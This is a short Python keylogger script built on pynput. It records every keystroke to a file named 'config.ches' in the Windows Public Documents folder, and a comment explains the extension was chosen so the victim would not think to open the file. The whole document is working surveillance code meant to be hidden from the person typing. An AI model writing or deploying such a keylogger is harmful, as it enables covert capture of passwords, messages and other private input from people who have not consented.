from pynput import keyboard #The module we need for lestining the keyboard

#Every time a key is hit the script will call this function
def on_press(key):
    try:
        #The extension file is .ches because people would probably open a txt file to check whats in there
        f = open('C:\\Users\Public\\Documents\\config.ches','a') 
        if str(key) == 'Key.space':
            f.write(' ')
        elif str(key) == 'Key.enter':
            f.write('\n')
        else:
            f.write(key.char)
        f.close()
    except:
        f.close() 

#Here we initialize the thread of the keyboard listener
with keyboard.Listener(on_press = on_press) as listener:
    listener.join()